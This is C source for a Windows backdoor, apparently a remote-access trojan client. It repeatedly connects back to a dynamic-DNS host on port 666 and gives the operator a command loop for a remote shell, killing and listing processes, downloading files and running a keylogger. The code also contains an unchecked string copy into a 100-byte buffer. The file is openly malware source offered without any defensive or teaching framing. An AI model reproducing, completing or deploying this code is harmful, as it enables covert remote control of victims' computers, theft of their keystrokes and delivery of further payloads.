#include <Ws2tcpip.h>
#include <stdio.h>
#include <stdint.h>
#include "error.h"
#include "sock.h"
#include "cmd.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "urlmon.lib")

#define REMOTE_HOST "z0r.ddns.net"
#define REMOTE_PORT 666
#define DEFAULT_PORT "666"	/* Must be the same as REMOTE_PORT */

DWORD WINAPI HandleConnection(SOCKET sock);
SOCKET WINAPI BackConnect(char *hostname);

int main(int argc, char *argv[])
{
	WSADATA wsadata;
	SOCKET server;

	if (FAILED(WSAStartup(MAKEWORD(2, 0), &wsadata)))
	{
		FormatError(WSAGetLastError());
		goto _end;
	}

	while (1)
	{
		server = BackConnect(REMOTE_HOST);

		if (server != INVALID_SOCKET)
			HandleConnection(server);

		Sleep(10000);
	}

_end:
	WSACleanup();
}

SOCKET WINAPI BackConnect(char *hostname)
{
	struct addrinfo *result = NULL;
	struct addrinfo *ptr = NULL;
	struct addrinfo hints;
	struct sockaddr_in *remote_addr_ptr = NULL;
	SOCKET sock = INVALID_SOCKET;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	getaddrinfo(hostname, DEFAULT_PORT, &hints, &result);
	ptr = result;

	if (ptr && ptr->ai_family == AF_INET)
	{
		remote_addr_ptr = (struct sockaddr_in *)ptr->ai_addr;
		printf("IPv4 address %s, port %u\n", inet_ntoa(remote_addr_ptr->sin_addr), remote_addr_ptr->sin_port);

		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (sock == INVALID_SOCKET)
		{
			FormatError(WSAGetLastError());
			goto _end;
		}

		remote_addr_ptr->sin_addr.s_addr = inet_addr("127.0.0.1");
		remote_addr_ptr->sin_port = htons(REMOTE_PORT);
		if (connect(sock, (struct sockaddr *)remote_addr_ptr, sizeof(*remote_addr_ptr)) == SOCKET_ERROR)
		{
			printf("Connection to %s port %u failed\n", inet_ntoa(remote_addr_ptr->sin_addr), remote_addr_ptr->sin_port);
			FormatError(WSAGetLastError());
			closesocket(sock);
			sock = INVALID_SOCKET;
			goto _end;
		}
	}

_end:
	return sock;
}

DWORD WINAPI HandleConnection(SOCKET sock)
{
	char buffer[1024];
	char win[MAX_PATH];
	char cmd[MAX_PATH];

	SendData(sock, "remote> Privet, potroshitel!\n");

	while (1)
	{
		SendData(sock, "remote>");
		ZeroMemory(buffer, 1024);

		int ret = recv(sock, buffer, 1024, 0);
		if (ret == SOCKET_ERROR) break;

		if (ret > 0)
		{
			int delimiter = strcspn(buffer, ":");
			char arg[100];
			lstrcpyA(arg, &buffer[delimiter + 1]);

			switch (buffer[0])
			{
			case 's':
				GetConsole(sock);
				break;
			case 'k':
				KillProcess(sock, arg);
				break;
			case 'p':
				SendProcessList(sock);
				break;
			case 'u':
				DownloadFile(sock, arg);
				break;
			case 'l':
				KeyLogger(sock);
				break;
			default:
				break;
			}
		}
	}

	return 0;
}